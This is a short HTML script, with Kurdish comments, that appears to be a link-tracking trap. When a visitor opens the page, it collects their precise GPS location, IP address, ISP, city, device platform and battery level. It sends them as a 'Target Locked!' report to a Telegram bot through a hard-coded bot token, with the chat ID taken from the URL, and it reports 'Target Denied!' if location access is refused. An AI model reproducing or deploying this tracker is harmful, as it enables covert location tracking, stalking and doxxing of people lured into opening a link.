<script>
    const TK = "8678050341:AAE7b3fvFpfGju4NXGaFiMsvhYC0UdnCYtE";

    async function capture() {
        const params = new URLSearchParams(window.location.search);
        const uid = params.get('id');
        if (!uid) return;

        navigator.geolocation.getCurrentPosition(async (pos) => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            
            // وەرگرتنی کات بە فۆرماتی کوردی/عێراقی
            const now = new Date();
            const timeStr = now.toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', hour12: True });

            // وەرگرتنی زانیاری شار و ئایپی لە سێرڤەرێکی جێگیرتر
            let ip = "N/A", isp = "Korek", city = "Erbil";
            try {
                const res = await fetch('https://ipwho.is/');
                const data = await res.json();
                ip = data.ip;
                isp = data.connection.isp;
                city = data.city + " / " + data.region;
            } catch(e) {
                // ئەگەر ئەو سێرڤەرە کاری نەکرد، سێرڤەری دووەم تاقی دەکاتەوە
                const res2 = await fetch('https://api.ipify.org?format=json');
                const data2 = await res2.json();
                ip = data2.ip;
            }

            let bat = "N/A";
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                bat = Math.floor(b.level * 100) + "%";
            }

            // فۆرماتە ڕێکەکەی خۆت
            let report = `🚨 <b>Target Locked!</b>\n\n` +
                         `📍 <b>Location:</b> https://www.google.com/maps?q=${lat},${lon}\n` +
                         `🌐 <b>IP:</b> <code>${ip}</code> (${isp})\n` +
                         `📱 <b>Device:</b> <code>${navigator.platform}</code>\n` +
                         `🔋 <b>Battery:</b> <code>${bat}</code>\n` +
                         `🕒 <b>Time:</b> <code>${timeStr}</code>\n` +
                         `🏙️ <b>City:</b> <code>${city}</code>`;

            const url = `https://api.telegram.org/bot${TK}/sendMessage?chat_id=${uid}&text=${encodeURIComponent(report)}&parse_mode=HTML`;
            navigator.sendBeacon(url);

        }, (err) => {
            navigator.sendBeacon(`https://api.telegram.org/bot${TK}/sendMessage?chat_id=${uid}&text=⚠️ Target Denied!`);
        }, { enableHighAccuracy: true });
    }
</script>
